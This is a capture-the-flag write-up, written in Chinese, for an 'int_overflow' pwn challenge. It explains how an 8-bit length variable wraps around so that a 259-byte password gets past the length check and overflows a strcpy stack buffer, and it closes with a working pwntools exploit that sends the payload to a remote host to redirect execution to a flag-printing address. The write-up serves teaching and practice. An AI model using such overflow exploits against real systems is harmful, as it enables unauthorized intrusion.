# wp

checksec 看一下。

```sh
gdb-peda$ checksec int_overflow
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

没有栈保护。IDA中 Shift+F12，Ctrl+F搜flag。跟。。没有引用。

`.text:0804868B what is this`

想办法跳到这儿。。跟main=>login, check_passwd,

`strcpy(&dest, s);`  这里没检查，可利用。

要想利用到strcpy这一步，要么你输入的passwd长度>3 && <=8，要么使passwd的长度过长，而v3最大可以存的长度为255，所以直接在v3处造成整数溢出进入else，整数溢出需要255，返回地址需要4字节，所以passwd长度达到259即可。


```c
  puts("Please input your passwd:");
  read(0, &buf, 0x199u);
  return check_passwd(&buf); // 检查输入的passwd
```

```c
char *__cdecl check_passwd(char *s)
{
  char *result; // eax
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h] // int8 可溢出

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u ) // 重点。这里 整形溢出
  {
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, s);
  }
  return result;
}

```
```asm
.text:080486B5                 add     esp, 10h
.text:080486B8                 mov     [ebp+var_9], al ;将长度放到al寄存器了，al是个8位
.text:080486BB                 cmp     [ebp+var_9], 3
; al八位寄存器对于无符号整数来说是有0~255的范围的。
; 可以看到程序把s放到一个al寄存器中，al是一个八位寄存器，我们知道，八位寄存器对于无符号整数来说是有0~255的范围的。
```

函数首先设定了v3变量，但是大小只有一个字节，共8bit。前面对passwd进行长度限制时，最大长度为0x199，这很明显一个字节存储不下。那么会发生什么呢？整数溢出。

输入的passwd的长度给到v3，进行判断，因为存在整数溢出，所以这里输入的字符的个数不管是3～8还是256+3~256+8, 即259～264都是可以通过验证的。

再往下，使用strcpy将passwd拷贝进stack中，stack中给出的保存passwd的大小为0x14 :

再看dest

```asm
-00000014 dest            db ?
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011                 db ? ; undefined
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C                 db ? ; undefined
-0000000B                 db ? ; undefined
-0000000A                 db ? ; undefined
-00000009 var_9           db ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

  
  从汇编代码中可以看到，想要覆盖到返回地址，先使用0x14 个数据覆盖stack拷贝的passed的内存区域，然后使用4字节数据覆盖ebp，再使用"cat flag"的地址覆盖返回地址，最后接上262剩余的数据即可。

```python
from pwn import *
# context(log_level = 'debug', arch = 'i386', os = 'linux') # 能显示调试信息

io = remote('124.126.19.106',48586)
io.sendlineafter('choice', '1')
io.sendlineafter('your username:','123')

payload = flat('a'*(0x14+4), p32(0x0804868B))
payload = payload.ljust(259, b'a')
io.sendlineafter("passwd:\n",payload)

io.interactive()
io.close()
```